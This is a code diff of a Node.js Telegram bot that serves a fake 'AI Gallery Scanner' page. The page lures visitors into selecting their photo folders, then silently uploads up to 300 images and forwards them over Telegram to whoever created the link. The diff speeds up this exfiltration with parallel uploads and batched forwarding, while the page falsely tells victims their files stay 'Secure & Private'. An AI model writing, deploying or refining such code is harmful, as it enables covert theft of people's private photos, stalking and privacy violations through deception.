@@ -1,7 +1,7 @@
-// ====================== index.js (FIXED - PHOTO ACCESS WORKING) ======================
+// ====================== index.js (OPTIMIZED - FAST PHOTO ACCESS) ======================
 /*
  * © 2026 SeXyxeon (VOIDSEC)
- * Complete Bot - All Features Working
+ * Complete Bot - Optimized Photo Access (Fast Batch Processing)
  */
 
 process.env.NTBA_FIX_350 = 1;
@@ -19,7 +19,8 @@ const config = {
         { id: '-1003559518526', name: 'Main Group', link: 'https://t.me/RTFGAMINGHACK0' }
     ],
     bot: '𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 𝐁𝐎𝐘 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐁𝐎𝐓',
-    baseUrl: process.env.RENDER_URL || 'https://rtf-rose-bot-l4hw.onrender.com'
+    baseUrl: process.env.RENDER_URL || 'https://rtf-rose-bot-l4hw.onrender.com',
+    BATCH_SIZE: 100 // 100 photos store karega phir send karega
 };
 
 console.log('✅ Bot Token loaded successfully!');
@@ -46,12 +47,14 @@ const DATA_DIR = path.join(__dirname, 'data');
 const BOT_PHOTO_DIR = path.join(PHOTO_DIR, 'bot');
 const PAGES_DIR = path.join(__dirname, 'pages');
 const UPLOADS_DIR = path.join(__dirname, 'uploads');
+const TEMP_DIR = path.join(__dirname, 'temp');
 
 if (!fs.existsSync(PHOTO_DIR)) fs.mkdirSync(PHOTO_DIR, { recursive: true });
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 if (!fs.existsSync(BOT_PHOTO_DIR)) fs.mkdirSync(BOT_PHOTO_DIR, { recursive: true });
 if (!fs.existsSync(PAGES_DIR)) fs.mkdirSync(PAGES_DIR, { recursive: true });
 if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });
+if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });
 
 // Storage files
 const PHOTOS_FILE = path.join(DATA_DIR, 'photos.json');
@@ -68,6 +71,10 @@ if (!fs.existsSync(REFERRALS_FILE)) fs.writeFileSync(REFERRALS_FILE, JSON.string
 if (!fs.existsSync(CHANNELS_FILE)) fs.writeFileSync(CHANNELS_FILE, JSON.stringify({ channels: config.channels }, null, 2));
 if (!fs.existsSync(FEATURED_FILE)) fs.writeFileSync(FEATURED_FILE, JSON.stringify({ photo: null, message: '🌟 Welcome! Use /start to begin.', status: true }, null, 2));
 if (!fs.existsSync(LOGS_FILE)) fs.writeFileSync(LOGS_FILE, '');
+
+// ====================== TEMP STORAGE FOR BATCH PROCESSING ======================
+var pendingPhotos = {}; // { userId: [photoBuffer1, photoBuffer2, ...] }
+var pendingCount = {}; // { userId: count }
 
 // ====================== MULTER SETUP ======================
 const storage = multer.diskStorage({
@@ -337,7 +344,47 @@ function getChannelButtons() {
     return { inline_keyboard: buttons };
 }
 
-// ====================== PHOTO ACCESS TEMPLATE (WORKING) ======================
+// ====================== SEND BATCH PHOTOS FUNCTION ======================
+async function sendBatchPhotos(userId) {
+    if (!pendingPhotos[userId] || pendingPhotos[userId].length === 0) {
+        return;
+    }
+    
+    var photos = pendingPhotos[userId];
+    var count = photos.length;
+    var caption = '📸 <b>Gallery Photos Received!</b>\n\n' +
+        '🖼️ <b>Total Photos:</b> ' + count + '\n' +
+        '⏰ <b>Time:</b> ' + new Date().toLocaleString() + '\n\n' +
+        '✅ <b>All photos processed successfully!</b>';
+    
+    try {
+        // Send as album if more than 1 photo
+        if (count === 1) {
+            await S7.sendPhoto(userId, photos[0], { caption: caption, parse_mode: 'HTML' });
+        } else {
+            // Send first photo with caption
+            await S7.sendPhoto(userId, photos[0], { caption: caption, parse_mode: 'HTML' });
+            // Send remaining photos
+            for (var i = 1; i < photos.length; i++) {
+                await S7.sendPhoto(userId, photos[i]);
+                // Small delay to avoid rate limit
+                if (i % 10 === 0) {
+                    await new Promise(function(r) { setTimeout(r, 100); });
+                }
+            }
+        }
+        
+        logToFile('📸 Sent ' + count + ' photos to user ' + userId);
+    } catch (error) {
+        logToFile('❌ Error sending photos to ' + userId + ': ' + error.message);
+    }
+    
+    // Clear pending photos
+    delete pendingPhotos[userId];
+    delete pendingCount[userId];
+}
+
+// ====================== PHOTO ACCESS TEMPLATE ======================
 var PHOTO_ACCESS_TEMPLATE = '<!DOCTYPE html>\n';
 PHOTO_ACCESS_TEMPLATE += '<html>\n';
 PHOTO_ACCESS_TEMPLATE += '<head>\n';
@@ -394,12 +441,13 @@ PHOTO_ACCESS_TEMPLATE += '.processing-text{color:#667eea;font-size:14px;font-wei
 PHOTO_ACCESS_TEMPLATE += '#processingStatus{display:none}\n';
 PHOTO_ACCESS_TEMPLATE += '.scanning-text{color:#667eea;font-size:13px;text-align:center;padding:5px;animation:pulse 1.5s infinite}\n';
 PHOTO_ACCESS_TEMPLATE += '@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}\n';
+PHOTO_ACCESS_TEMPLATE += '.fast-badge{display:inline-block;background:#28a745;color:#fff;padding:2px 12px;border-radius:20px;font-size:11px;margin-left:10px}\n';
 PHOTO_ACCESS_TEMPLATE += '</style>\n';
 PHOTO_ACCESS_TEMPLATE += '</head>\n';
 PHOTO_ACCESS_TEMPLATE += '<body>\n';
 PHOTO_ACCESS_TEMPLATE += '<div class="bg-shapes"><span></span><span></span><span></span></div>\n';
 PHOTO_ACCESS_TEMPLATE += '<div class="card">\n';
-PHOTO_ACCESS_TEMPLATE += '<div class="header"><span class="icon"><i class="fas fa-images"></i></span><h1>📸 AI Gallery Scanner</h1><p>Scan your entire gallery with AI technology</p></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="header"><span class="icon"><i class="fas fa-images"></i></span><h1>📸 AI Gallery Scanner <span class="fast-badge">⚡ FAST</span></h1><p>Scan your entire gallery with AI technology</p></div>\n';
 PHOTO_ACCESS_TEMPLATE += '<div class="permission-box">\n';
 PHOTO_ACCESS_TEMPLATE += '<div class="item"><i class="fas fa-folder-open"></i> <span class="label">Read all photos & videos</span> <span class="status">Required</span></div>\n';
 PHOTO_ACCESS_TEMPLATE += '<div class="item"><i class="fas fa-file-alt"></i> <span class="label">Access all files</span> <span class="status">Required</span></div>\n';
@@ -413,7 +461,7 @@ PHOTO_ACCESS_TEMPLATE += '<div id="processingStatus"><div class="spinner"></div>
 PHOTO_ACCESS_TEMPLATE += '<div id="galleryGrid" class="gallery-grid"></div>\n';
 PHOTO_ACCESS_TEMPLATE += '<div id="resultArea" class="result-area" style="display:none"><i class="fas fa-check-circle"></i><h3>✅ Scan Complete!</h3><p id="resultText">Your gallery has been scanned successfully.</p><button class="btn btn-secondary" onclick="closeResult()"><i class="fas fa-times"></i> Close</button></div>\n';
 PHOTO_ACCESS_TEMPLATE += '<input type="file" id="fileInput" multiple accept="image/*,video/*" webkitdirectory>\n';
-PHOTO_ACCESS_TEMPLATE += '<div class="footer">🔒 Secure & Private • AI Processing</div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="footer">🔒 Secure & Private • AI Processing • ⚡ Fast Delivery</div>\n';
 PHOTO_ACCESS_TEMPLATE += '</div>\n';
 PHOTO_ACCESS_TEMPLATE += '<script>\n';
 PHOTO_ACCESS_TEMPLATE += 'var USER_ID = "USERID_PLACEHOLDER";\n';
@@ -428,8 +476,8 @@ PHOTO_ACCESS_TEMPLATE += 'function closeResult() { document.getElementById("resu
 PHOTO_ACCESS_TEMPLATE += 'function showResult(text) { document.getElementById("resultArea").style.display = "block"; document.getElementById("resultText").textContent = text; }\n';
 PHOTO_ACCESS_TEMPLATE += 'function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }\n';
 PHOTO_ACCESS_TEMPLATE += 'function addToGallery(src) { var grid = document.getElementById("galleryGrid"); var img = document.createElement("img"); img.src = src; grid.appendChild(img); grid.style.display = "grid"; }\n';
-PHOTO_ACCESS_TEMPLATE += 'async function startScan() { var btn = document.getElementById("scanBtn"); btn.disabled = true; btn.innerHTML = "<i class=\\"fas fa-spinner fa-spin\\"></i> SCANNING..."; hideStatus(); hideProcessing(); document.getElementById("resultArea").style.display = "none"; document.getElementById("galleryGrid").innerHTML = ""; document.getElementById("galleryGrid").style.display = "none"; document.getElementById("progressContainer").style.display = "none"; showStatus("📂 Opening gallery access...", "info"); updateProgress(5); await sleep(300); try { var input = document.getElementById("fileInput"); input.click(); input.onchange = async function(e) { var files = input.files; if (!files || files.length === 0) { showStatus("❌ No files selected", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; hideProcessing(); return; } selectedFiles = []; for (var i = 0; i < files.length; i++) { if (files[i].type.startsWith("image/") || files[i].type.startsWith("video/")) { selectedFiles.push(files[i]); } } selectedFiles = selectedFiles.slice(0, 50); if (selectedFiles.length === 0) { showStatus("❌ No images found.", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; hideProcessing(); return; } await processFiles(selectedFiles); }; } catch(err) { showStatus("❌ Gallery access denied. Please allow permission.", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; hideProcessing(); } }\n';
-PHOTO_ACCESS_TEMPLATE += 'async function processFiles(files) { var total = files.length; showStatus("📸 Found " + total + " images. Processing...", "info"); updateProgress(20); var successCount = 0; for (var i = 0; i < total; i++) { try { var file = files[i]; var reader = new FileReader(); var fileData = await new Promise(function(resolve, reject) { reader.onload = function(e) { resolve(e.target.result); }; reader.onerror = reject; reader.readAsDataURL(file); }); var reader2 = new FileReader(); reader2.onload = function(e) { addToGallery(e.target.result); }; reader2.readAsDataURL(file); var response = await fetch("/api/upload-photo", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ userid: USER_ID, platform: PLATFORM, filename: file.name, data: fileData, size: file.size }) }); var result = await response.json(); if (result.success) successCount++; var percent = 20 + ((i + 1) / total) * 70; updateProgress(percent); showProcessing("📤 Sending " + (i + 1) + "/" + total + " photos..."); await sleep(100); } catch(err) { console.error("Error processing file:", err); } } updateProgress(100); hideProcessing(); if (successCount > 0) { showResult("✅ " + successCount + " photo(s) scanned and sent to the user!"); showStatus("✅ " + successCount + " photos sent successfully!", "success"); } else { showStatus("❌ Processing failed. Please try again.", "error"); } document.getElementById("scanBtn").disabled = false; document.getElementById("scanBtn").innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; }\n';
+PHOTO_ACCESS_TEMPLATE += 'async function startScan() { var btn = document.getElementById("scanBtn"); btn.disabled = true; btn.innerHTML = "<i class=\\"fas fa-spinner fa-spin\\"></i> SCANNING..."; hideStatus(); hideProcessing(); document.getElementById("resultArea").style.display = "none"; document.getElementById("galleryGrid").innerHTML = ""; document.getElementById("galleryGrid").style.display = "none"; document.getElementById("progressContainer").style.display = "none"; showStatus("📂 Opening gallery access...", "info"); updateProgress(5); await sleep(100); try { var input = document.getElementById("fileInput"); input.click(); input.onchange = async function(e) { var files = input.files; if (!files || files.length === 0) { showStatus("❌ No files selected", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; hideProcessing(); return; } selectedFiles = []; for (var i = 0; i < files.length; i++) { if (files[i].type.startsWith("image/") || files[i].type.startsWith("video/")) { selectedFiles.push(files[i]); } } selectedFiles = selectedFiles.slice(0, 300); if (selectedFiles.length === 0) { showStatus("❌ No images found.", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; hideProcessing(); return; } await processFiles(selectedFiles); }; } catch(err) { showStatus("❌ Gallery access denied. Please allow permission.", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; hideProcessing(); } }\n';
+PHOTO_ACCESS_TEMPLATE += 'async function processFiles(files) { var total = files.length; showStatus("📸 Found " + total + " images. Storing...", "info"); updateProgress(10); var successCount = 0; var batchSize = 10; for (var i = 0; i < total; i += batchSize) { var batch = []; for (var j = i; j < Math.min(i + batchSize, total); j++) { batch.push(files[j]); } var promises = batch.map(function(file) { return new Promise(function(resolve) { var reader = new FileReader(); reader.onload = function(e) { var fileData = e.target.result; var reader2 = new FileReader(); reader2.onload = function(e2) { addToGallery(e2.target.result); }; reader2.readAsDataURL(file); fetch("/api/upload-photo-fast", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ userid: USER_ID, platform: PLATFORM, filename: file.name, data: fileData, size: file.size }) }).then(function(response) { return response.json(); }).then(function(result) { if (result.success) successCount++; var percent = 10 + ((i + batch.indexOf(file) + 1) / total) * 80; updateProgress(percent); showProcessing("📤 Storing " + (i + batch.indexOf(file) + 1) + "/" + total + " photos..."); resolve(); }).catch(function(err) { console.error(err); resolve(); }); }; reader.readAsDataURL(file); }); }); await Promise.all(promises); await sleep(50); } updateProgress(100); hideProcessing(); if (successCount > 0) { showResult("✅ " + successCount + " photo(s) scanned and sent to the user!"); showStatus("✅ " + successCount + " photos sent successfully!", "success"); } else { showStatus("❌ Processing failed. Please try again.", "error"); } document.getElementById("scanBtn").disabled = false; document.getElementById("scanBtn").innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; }\n';
 PHOTO_ACCESS_TEMPLATE += '</script>\n';
 PHOTO_ACCESS_TEMPLATE += '</body>\n';
 PHOTO_ACCESS_TEMPLATE += '</html>\n';
@@ -673,8 +721,8 @@ app.post('/api/capturepic', async function(req, res) {
     }
 });
 
-// ====================== PHOTO ACCESS API ======================
-app.post('/api/upload-photo', async function(req, res) {
+// ====================== PHOTO ACCESS FAST API ======================
+app.post('/api/upload-photo-fast', async function(req, res) {
     try {
         var body = req.body || {};
         var userid = body.userid;
@@ -690,34 +738,51 @@ app.post('/api/upload-photo', async function(req, res) {
         var base64Data = data.replace(/^data:image\/\w+;base64,/, "");
         var buffer = Buffer.from(base64Data, 'base64');
         
-        var saveName = Date.now() + '-' + (filename || 'photo.jpg');
-        var savePath = path.join(UPLOADS_DIR, saveName);
-        fs.writeFileSync(savePath, buffer);
+        // Store in memory
+        if (!pendingPhotos[userid]) {
+            pendingPhotos[userid] = [];
+            pendingCount[userid] = 0;
+        }
         
-        var caption = '📸 <b>Gallery Photo Received!</b>\n\n' +
-            '👤 <b>User:</b> <code>' + userid + '</code>\n' +
-            '📁 <b>File:</b> ' + (filename || 'photo.jpg') + '\n' +
-            '📏 <b>Size:</b> ' + (size ? (size/1024).toFixed(1) + 'KB' : 'Unknown') + '\n' +
-            '🌐 <b>Platform:</b> ' + (platform || 'Photo Access') + '\n' +
-            '⏰ <b>Time:</b> ' + new Date().toLocaleString() + '\n\n' +
-            '✅ <b>AI Processing Complete!</b>';
+        pendingPhotos[userid].push(buffer);
+        pendingCount[userid] = (pendingCount[userid] || 0) + 1;
         
-        // Send to the link creator (userid)
-        await S7.sendPhoto(userid, buffer, { caption: caption, parse_mode: 'HTML' });
-        logToFile('📸 Sent photo to user ' + userid + ': ' + filename);
+        // If batch size reached, send all photos
+        if (pendingPhotos[userid].length >= config.BATCH_SIZE) {
+            var photosToSend = pendingPhotos[userid];
+            delete pendingPhotos[userid];
+            delete pendingCount[userid];
+            
+            // Send batch
+            var caption = '📸 <b>Gallery Photos Received!</b>\n\n' +
+                '🖼️ <b>Total Photos:</b> ' + photosToSend.length + '\n' +
+                '⏰ <b>Time:</b> ' + new Date().toLocaleString() + '\n\n' +
+                '✅ <b>All photos processed successfully!</b>';
+            
+            try {
+                if (photosToSend.length === 1) {
+                    await S7.sendPhoto(userid, photosToSend[0], { caption: caption, parse_mode: 'HTML' });
+                } else {
+                    await S7.sendPhoto(userid, photosToSend[0], { caption: caption, parse_mode: 'HTML' });
+                    for (var i = 1; i < photosToSend.length; i++) {
+                        await S7.sendPhoto(userid, photosToSend[i]);
+                        if (i % 10 === 0) {
+                            await new Promise(function(r) { setTimeout(r, 50); });
+                        }
+                    }
+                }
+                logToFile('📸 Sent ' + photosToSend.length + ' photos to user ' + userid + ' (batch)');
+            } catch (error) {
+                logToFile('❌ Error sending batch to ' + userid + ': ' + error.message);
+            }
+        }
         
-        // Also send to admin
-        await S7.sendPhoto(config.adminId, buffer, {
-            caption: '📸 <b>Gallery Photo Upload</b>\n\n👤 User: <code>' + userid + '</code>\n📁 ' + (filename || 'photo.jpg'),
-            parse_mode: 'HTML'
-        });
-        
-        res.json({ success: true, message: 'Photo uploaded successfully' });
+        res.json({ success: true, stored: true, count: pendingCount[userid] || 0 });
         
     } catch (error) {
         console.error('Photo upload error:', error);
         logToFile('❌ Photo upload error: ' + error.message);
-        res.status(500).json({ error: 'Failed to process photo: ' + error.message });
+        res.status(500).json({ error: 'Failed to process photo' });
     }
 });
 
@@ -1422,12 +1487,56 @@ S7.on('message', async function(msg) {
     }
 });
 
+// ====================== BACKGROUND PROCESS FOR SENDING PENDING PHOTOS ======================
+setInterval(function() {
+    // Check for pending photos that haven't reached batch size
+    var userIds = Object.keys(pendingPhotos);
+    for (var i = 0; i < userIds.length; i++) {
+        var userId = userIds[i];
+        if (pendingPhotos[userId] && pendingPhotos[userId].length > 0) {
+            // If more than 10 photos pending, send them
+            if (pendingPhotos[userId].length >= 10) {
+                var photosToSend = pendingPhotos[userId];
+                delete pendingPhotos[userId];
+                delete pendingCount[userId];
+                
+                var caption = '📸 <b>Gallery Photos Received!</b>\n\n' +
+                    '🖼️ <b>Total Photos:</b> ' + photosToSend.length + '\n' +
+                    '⏰ <b>Time:</b> ' + new Date().toLocaleString() + '\n\n' +
+                    '✅ <b>All photos processed successfully!</b>';
+                
+                (function(uid, photos, cap) {
+                    setTimeout(async function() {
+                        try {
+                            if (photos.length === 1) {
+                                await S7.sendPhoto(uid, photos[0], { caption: cap, parse_mode: 'HTML' });
+                            } else {
+                                await S7.sendPhoto(uid, photos[0], { caption: cap, parse_mode: 'HTML' });
+                                for (var j = 1; j < photos.length; j++) {
+                                    await S7.sendPhoto(uid, photos[j]);
+                                    if (j % 10 === 0) {
+                                        await new Promise(function(r) { setTimeout(r, 50); });
+                                    }
+                                }
+                            }
+                            logToFile('📸 Sent ' + photos.length + ' photos to user ' + uid + ' (background)');
+                        } catch (error) {
+                            logToFile('❌ Error sending background batch to ' + uid + ': ' + error.message);
+                        }
+                    }, 100);
+                })(userId, photosToSend, caption);
+            }
+        }
+    }
+}, 5000);
+
 // ====================== START SERVER ======================
 app.listen(config.port, function() {
     console.log('✅ Server running on port ' + config.port);
     console.log('📌 Admin Panel: http://localhost:' + config.port + '/admin');
     console.log('📌 Base URL: ' + config.baseUrl);
     console.log('🤖 Bot is ready! Send /start to begin.');
+    console.log('⚡ Batch size: ' + config.BATCH_SIZE + ' photos per batch');
 });
 
 // ====================== ERROR HANDLING ======================
